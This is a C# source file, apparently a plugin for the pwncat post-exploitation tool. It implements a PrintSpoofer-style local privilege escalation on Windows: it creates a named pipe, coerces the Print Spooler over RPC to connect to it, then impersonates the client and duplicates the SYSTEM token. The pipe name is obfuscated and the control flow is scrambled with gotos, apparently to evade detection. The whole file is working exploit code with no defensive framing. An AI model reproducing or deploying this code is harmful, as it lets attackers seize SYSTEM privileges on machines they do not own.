using tatertot.RPC;
using System;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;
using System.Threading;
using static tatertot.RPC.rprn;


class Plugin
{
    public static Type ProtocolErrorType;

    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static void pwncat(Assembly stagetwo)
    {
        ProtocolErrorType = stagetwo.GetType("stagetwo.Protocol.ProtocolError");
    }

    public static Exception ProtocolError(int code, string message)
    {
        return (Exception)Activator.CreateInstance(ProtocolErrorType, new object[] { code, message });
    }

    static int get_system_token()
    {

        SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
        string pipeName = Guid.NewGuid().ToString("N");
        IntPtr hSystemToken = IntPtr.Zero;
        IntPtr hSystemTokenDup = IntPtr.Zero;
        rprn rprn = new rprn();
        var dEVMODE_CONTAINER = new DEVMODE_CONTAINER();
        IntPtr rpcPrinterHandle = IntPtr.Zero;
        IntPtr pipeHandle = IntPtr.Zero;
        Thread thread = null;

        goto one;

    two:

        // Open the printer to trigger a connection to the named pipe
        rprn.RpcOpenPrinter(string.Format("\\\\{0}", Environment.MachineName), out rpcPrinterHandle, null, ref dEVMODE_CONTAINER, 0);
        if (rpcPrinterHandle == IntPtr.Zero)
        {
            CloseHandle(pipeHandle);
            throw ProtocolError(Marshal.GetLastWin32Error(), "rpc open printer failed");
        }

        goto three;

    four:

        // Wait for the connect to finish
        if (!thread.Join(5000))
        {
            CloseHandle(rpcPrinterHandle);
            CloseHandle(pipeHandle);
            throw ProtocolError(-1, "connect named pipe timed out!");
        }

        goto five;

    one:

        string name = "--.-pipe-{0}-pipe-qpoolqq".Replace("-", "\\").Replace("q", "s");

        // Create a named pipe
        pipeHandle = CreateNamedPipeW(string.Format(name, pipeName), 0x00000003 | 0x40000000, 0x00000000, 10, 2048, 2048, 0, ref securityAttributes);
        if (pipeHandle == IntPtr.Zero)
        {
            throw ProtocolError(Marshal.GetLastWin32Error(), "create named pipe failed");
        }

        goto two;

    five:

        // Impersonate the client
        if (!ImpersonateNamedPipeClient(pipeHandle))
        {
            CloseHandle(rpcPrinterHandle);
            CloseHandle(pipeHandle);
            throw ProtocolError(Marshal.GetLastWin32Error(), "impersonate named pipe client failed");
        }

        goto six;

    eight:

        // Close unneeded handles
        CloseHandle(rpcPrinterHandle);
        CloseHandle(pipeHandle);
        CloseHandle(hSystemToken);

        return (int)hSystemTokenDup;

    three:

        // Trigger connection to named pipe
        if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(rpcPrinterHandle, 0x00000100, 0, string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName), 0) == -1)
        {
            CloseHandle(rpcPrinterHandle);
            CloseHandle(pipeHandle);
            throw ProtocolError(Marshal.GetLastWin32Error(), "rpc remote find first printer change notification failed");
        }

        // Connect the named pipe in a background thread
        thread = new Thread(() => ConnectNamedPipe(pipeHandle, IntPtr.Zero));
        thread.Start();

        goto four;

    seven:

        // Duplicate the system token
        if (!DuplicateTokenEx(hSystemToken, 983551, 0, 2, 1, ref hSystemTokenDup))
        {
            CloseHandle(rpcPrinterHandle);
            CloseHandle(pipeHandle);
            throw ProtocolError(Marshal.GetLastWin32Error(), "duplicate token failed");
        }

        goto eight;

    six:

        // Retreive the system token from the current thread
        if (!OpenThreadToken(GetCurrentThread(), 983551, false, ref hSystemToken))
        {
            CloseHandle(rpcPrinterHandle);
            CloseHandle(pipeHandle);
            throw ProtocolError(Marshal.GetLastWin32Error(), "open thread token failed");
        }

        goto seven;
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);
    [SecurityCritical]
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool CloseHandle(IntPtr handle);
    [DllImport("kernel32.dll", EntryPoint = "GetCurrentThread", CallingConvention = CallingConvention.Cdecl)]
    public static extern IntPtr GetCurrentThread();
    [SecurityCritical]
    [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateNamedPipeW(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout,ref SECURITY_ATTRIBUTES securityAttributes);
    [SecurityCritical]
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public  static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);
    [SecurityCritical]
    [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool GetNamedPipeHandleState(IntPtr hNamedPipe, IntPtr lpState, IntPtr lpCurInstances, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout, StringBuilder lpUserName, int nMaxUserNameSize);

    [SecurityCritical]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
    [SecurityCritical]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenThreadToken(IntPtr ThreadHandle, long DesiredAccess, bool OpenAsSelf,ref IntPtr TokenHandle);
    [SecurityCritical]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken,long dwDesiredAccess,int lpTokenAttributes,int ImpersonationLevel,int TokenType,ref IntPtr phNewToken);

}